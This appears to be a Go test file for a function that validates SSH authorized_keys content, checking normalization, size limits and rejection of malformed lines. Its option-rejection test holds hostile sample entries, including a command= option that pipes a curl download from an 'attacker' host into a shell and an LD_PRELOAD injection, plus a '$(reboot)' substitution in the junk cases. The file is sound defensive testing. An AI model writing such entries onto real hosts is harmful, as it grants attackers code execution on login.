package hostspec

import (
	"strings"
	"testing"
)

const testKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRestOfKeyBase64IsFakeButLongEnoughForTest= sergey@appliance"

func TestValidateAuthorizedKeysContent_normalizes(t *testing.T) {
	in := "\n  " + testKey + "  \r\n\n" + testKey + "\n"
	out, err := ValidateAuthorizedKeysContent([]byte(in))
	if err != nil {
		t.Fatalf("valid content rejected: %v", err)
	}
	got := string(out)
	if got != testKey+"\n"+testKey+"\n" {
		t.Fatalf("unexpected normalization: %q", got)
	}
}

// An options field turns an authorized_keys entry into code execution on login;
// the broker must never write one.
func TestValidateAuthorizedKeysContent_rejectsOptions(t *testing.T) {
	for _, line := range []string{
		`command="/bin/sh -c curl attacker|sh" ` + testKey,
		`environment="LD_PRELOAD=/tmp/evil.so" ` + testKey,
		`permitopen="10.0.0.1:22",no-pty ` + testKey,
		`no-port-forwarding ` + testKey,
	} {
		if _, err := ValidateAuthorizedKeysContent([]byte(line + "\n")); err == nil {
			t.Fatalf("options line accepted: %s", line)
		}
	}
}

func TestValidateAuthorizedKeysContent_rejectsJunk(t *testing.T) {
	cases := map[string]string{
		"not a key":     "hello world\n",
		"NUL byte":      testKey + "\n\x00\n",
		"partial key":   "ssh-ed25519\n",
		"shell attempt": "$(reboot)\n",
	}
	for name, in := range cases {
		if _, err := ValidateAuthorizedKeysContent([]byte(in)); err == nil {
			t.Fatalf("%s: accepted", name)
		}
	}
}

func TestValidateAuthorizedKeysContent_limits(t *testing.T) {
	if _, err := ValidateAuthorizedKeysContent([]byte(strings.Repeat("a", MaxAuthorizedKeysBytes+1))); err == nil {
		t.Fatal("oversized content accepted")
	}
	many := strings.Repeat(testKey+"\n", MaxAuthorizedKeysLines+1)
	if _, err := ValidateAuthorizedKeysContent([]byte(many)); err == nil {
		t.Fatal("too many keys accepted")
	}
}

func TestValidateAuthorizedKeysContent_empty(t *testing.T) {
	out, err := ValidateAuthorizedKeysContent(nil)
	if err != nil {
		t.Fatalf("empty content rejected: %v", err)
	}
	if len(out) != 0 {
		t.Fatalf("expected empty output, got %q", out)
	}
}
